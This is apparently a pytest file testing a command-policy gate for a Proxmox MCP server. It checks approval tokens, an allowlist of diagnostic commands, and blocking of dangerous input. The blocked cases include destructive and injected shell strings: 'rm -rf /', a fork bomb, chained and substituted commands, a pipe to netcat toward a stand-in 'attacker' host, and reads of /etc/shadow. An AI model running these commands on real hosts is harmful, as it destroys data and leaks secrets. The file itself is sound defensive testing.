"""Tests for the command and high-risk operation policy gateway."""

from __future__ import annotations

from typing import Any

import pytest

from proxmox_mcp.config.models import CommandPolicyConfig
from proxmox_mcp.security.command_policy import CommandPolicyGate


def _gate(**overrides: Any) -> CommandPolicyGate:
    return CommandPolicyGate(CommandPolicyConfig(**overrides))


def test_command_approval_token_match_allows():
    gate = _gate(
        mode="audit_only",
        require_approval_token=True,
        approval_token="s3cret-token",
    )

    decision = gate.evaluate("uname -a", approval_token="s3cret-token")

    assert decision.allowed is True


@pytest.mark.parametrize(
    "supplied",
    [
        None,
        "",
        "wrong",
        "s3cret-toke",   # prefix
        "s3cret-token!", # suffix
    ],
)
def test_command_approval_token_mismatch_denies(supplied):
    gate = _gate(
        mode="audit_only",
        require_approval_token=True,
        approval_token="s3cret-token",
    )

    decision = gate.evaluate("uname -a", approval_token=supplied)

    assert decision.allowed is False
    assert decision.code == "CMD_POLICY_APPROVAL_REQUIRED"


def test_command_approval_token_not_configured_denies():
    gate = _gate(
        mode="audit_only",
        require_approval_token=True,
        approval_token=None,
    )

    decision = gate.evaluate("uname -a", approval_token="anything")

    assert decision.allowed is False
    assert decision.code == "CMD_POLICY_APPROVAL_NOT_CONFIGURED"


def test_high_risk_operation_token_match_allows():
    gate = _gate(
        high_risk_mode="enforce",
        high_risk_require_approval_token=True,
        high_risk_approval_token="approve-me",
    )

    decision = gate.evaluate_operation("delete_vm", approval_token="approve-me")

    assert decision.allowed is True


@pytest.mark.parametrize(
    "supplied",
    [
        None,
        "",
        "wrong",
        "approve-m",
        "approve-me ",
    ],
)
def test_high_risk_operation_token_mismatch_denies(supplied):
    gate = _gate(
        high_risk_mode="enforce",
        high_risk_require_approval_token=True,
        high_risk_approval_token="approve-me",
    )

    decision = gate.evaluate_operation("delete_vm", approval_token=supplied)

    assert decision.allowed is False
    assert decision.code == "OP_POLICY_APPROVAL_REQUIRED"


def test_high_risk_operation_falls_back_to_command_token():
    """When high_risk_approval_token is None, the command-level approval_token applies."""
    gate = _gate(
        high_risk_mode="enforce",
        approval_token="cmd-token",
        high_risk_require_approval_token=True,
        high_risk_approval_token=None,
    )

    assert gate.evaluate_operation("delete_vm", approval_token="cmd-token").allowed is True
    assert gate.evaluate_operation("delete_vm", approval_token="other").allowed is False


@pytest.mark.parametrize(
    "command",
    [
        "lsblk",
        "lsblk -f",
        "df",
        "df -h",
        "growpart /dev/sda 1",
        "resize2fs /dev/sda1",
        "xfs_growfs /",
        "systemctl status",
        "ip a",
        "ip route",
        "ss -tulpn",
        "findmnt",
        "parted -l",
    ],
)
def test_default_allowlist_permits_diagnostic_and_disk_commands(command):
    gate = _gate(mode="allowlist")
    decision = gate.evaluate(command)
    assert decision.allowed is True
    assert decision.code == "CMD_POLICY_ALLOW"


@pytest.mark.parametrize(
    "command,expected_code",
    [
        ("rm -rf /", "CMD_POLICY_DENY_PATTERN"),
        ("lsblk; rm -rf /", "CMD_POLICY_SHELL_METACHAR"),
        ("df -h && rm -rf /", "CMD_POLICY_SHELL_METACHAR"),
        (":(){:|:&};:", "CMD_POLICY_SHELL_METACHAR"),
        ("rm -rf /etc", "CMD_POLICY_DENY_PATTERN"),
    ],
)
def test_default_policy_blocks_destructive_commands_and_chained_exploits(command, expected_code):
    gate = _gate(mode="allowlist")
    decision = gate.evaluate(command)
    assert decision.allowed is False
    assert decision.code == expected_code


@pytest.mark.parametrize(
    "command",
    [
        "whoami",
        "curl https://example.com",
        "cat /etc/shadow",
    ],
)
def test_default_policy_blocks_unlisted_commands(command):
    gate = _gate(mode="allowlist")
    decision = gate.evaluate(command)
    assert decision.allowed is False
    assert decision.code == "CMD_POLICY_NOT_ALLOWLISTED"


@pytest.mark.parametrize(
    "command",
    [
        "zpool status",
        "zpool status rpool",
        "zpool list",
        "zpool iostat -v",
        "zpool scrub rpool",
        "smartctl -a /dev/nvme0n1",
        "smartctl -H /dev/sda",
        "smartctl --scan",
        "zramctl",
        "zramctl --output NAME,DISKSIZE,DATA,COMPR",
        "sysctl -a",
        "sysctl vm.swappiness",
        "apt update",
        "apt list --upgradable",
        "apt-get update",
        "apt-get dist-upgrade -y",
        "apt-cache policy proxmox-ve",
    ],
)
def test_command_policy_allows_new_safe_diagnostic_and_maintenance_commands(command):
    gate = _gate(mode="allowlist")
    decision = gate.evaluate(command)
    assert decision.allowed is True
    assert decision.code == "CMD_POLICY_ALLOW"


@pytest.mark.parametrize(
    "command,expected_code",
    [
        ("zpool destroy rpool", "CMD_POLICY_DENY_PATTERN"),
        ("zpool export rpool", "CMD_POLICY_DENY_PATTERN"),
        ("zpool scrub -s rpool", "CMD_POLICY_DENY_PATTERN"),
        ("apt remove nginx", "CMD_POLICY_DENY_PATTERN"),
        ("apt-get purge curl", "CMD_POLICY_DENY_PATTERN"),
        ("apt-get upgrade -y", "CMD_POLICY_DENY_PATTERN"),
        ("sysctl -w vm.swappiness=10", "CMD_POLICY_DENY_PATTERN"),
        ("sysctl --system", "CMD_POLICY_DENY_PATTERN"),
        ("zramctl --reset /dev/zram0", "CMD_POLICY_DENY_PATTERN"),
        ("zpool status; id", "CMD_POLICY_SHELL_METACHAR"),
        ("zpool status && reboot", "CMD_POLICY_SHELL_METACHAR"),
        ("sysctl -a | nc attacker 1234", "CMD_POLICY_SHELL_METACHAR"),
        ("smartctl -a $(whoami)", "CMD_POLICY_SHELL_METACHAR"),
        ("apt update `id`", "CMD_POLICY_SHELL_METACHAR"),
        ("df -h > /tmp/out", "CMD_POLICY_SHELL_METACHAR"),
        ("cat < /etc/shadow", "CMD_POLICY_SHELL_METACHAR"),
        ("lsblk\nid", "CMD_POLICY_SHELL_METACHAR"),
        ("smartctl -H /dev/sda\rid", "CMD_POLICY_SHELL_METACHAR"),
    ],
)
def test_command_policy_blocks_destructive_subcommands_and_shell_chaining(command, expected_code):
    gate = _gate(mode="allowlist")
    decision = gate.evaluate(command)
    assert decision.allowed is False
    assert decision.code == expected_code


@pytest.mark.parametrize(
    "op",
    [
        "pbs_verify_datastore",
        "pbs_scrub_zfs",
    ],
)
def test_high_risk_pbs_operations_require_token(op):
    gate = _gate(
        high_risk_mode="enforce",
        high_risk_require_approval_token=True,
        high_risk_approval_token="pbs-token",
    )
    assert gate.evaluate_operation(op, approval_token="wrong").allowed is False
    assert gate.evaluate_operation(op, approval_token="pbs-token").allowed is True


def test_loader_preserves_default_command_policy_patterns(monkeypatch):
    from proxmox_mcp.config.loader import load_config
    monkeypatch.delenv("COMMAND_POLICY_ALLOW_PATTERNS", raising=False)
    monkeypatch.delenv("COMMAND_POLICY_DENY_PATTERNS", raising=False)
    monkeypatch.setenv("PROXMOX_HOST", "127.0.0.1")
    monkeypatch.setenv("PROXMOX_USER", "root@pam")
    monkeypatch.setenv("PROXMOX_TOKEN_NAME", "tok")
    monkeypatch.setenv("PROXMOX_TOKEN_VALUE", "val")
    cfg = load_config()
    assert len(cfg.command_policy.allow_patterns) > 10
    assert any("zpool" in p for p in cfg.command_policy.allow_patterns)
    assert "pbs_verify_datastore" in cfg.command_policy.high_risk_operations
